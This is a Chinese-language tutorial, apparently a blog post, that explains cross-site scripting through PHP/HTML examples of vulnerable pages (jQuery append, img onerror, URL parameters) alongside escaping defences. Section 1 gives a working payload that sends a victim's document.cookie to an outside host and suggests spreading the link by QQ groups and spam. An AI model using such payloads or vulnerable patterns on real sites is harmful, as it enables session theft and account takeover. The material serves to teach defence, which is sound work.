## XSS攻击原理

**HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记**，例如，小于符号（<）被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如<）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。 [XSS攻击](https://baike.baidu.com/item/XSS攻击/954065?fr=aladdin)

## 1.通过<script\>攻击

举个例子：通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：

book.com/search?name=<script>document.location='http://vajoy/get?cookie='+document.cookie</script>

这样我们就可以获取别人的cookie信息了

## 2.通过append攻击

~~~html
<?php
    $username="\u003cscript\u003ealert('okok');";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
        <div>版权所有：<span id="username_info"></span></div>
        <script>
            $('#username_info').append("<?php echo htmlentities($username);?>");
        </script>
    </body>
</html>

~~~

 这样通过echo还是可以执行对应的脚本的  

## 3.通过Img标签攻击

当图片加载失败时，会调用该元素上面的onerror事件，我们正可以利用这里进行攻击。

~~~html
<?php
    $username="<script>alert('侯医生');</script>";
    $imgsrc="\" onerror=\"javascript:alert('侯医生');\"";

?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1，这个是图片：
            <img src="<?php echo $imgsrc;?>" />
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>
~~~

结果就是：

![img](https://images2015.cnblogs.com/blog/899904/201612/899904-20161222114958776-1323053243.png)

## 升级防御

看来，我们需要再次进行防御升级了，我们将输出的字符串中的`\`反斜杠进行转义(json转义)。这样，`\`就不会被当做unicode码的开头来被处理了。代码如下：

```js
document.getElementById('username_info').innerHTML = <?php echo json_encode(htmlentities($username));?>;
```

## 4.通过URL攻击

如果黑客在URL的这个参数中加入js代码，这样便又会被执行

![img](https://images2015.cnblogs.com/blog/899904/201612/899904-20161222120143042-1165980918.png)

像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出

```
<script>
    var value = decodeURIComponent("<?php echo htmlentities($_GET['username']);?>");
    $('#username_info').append(value);
</script>
```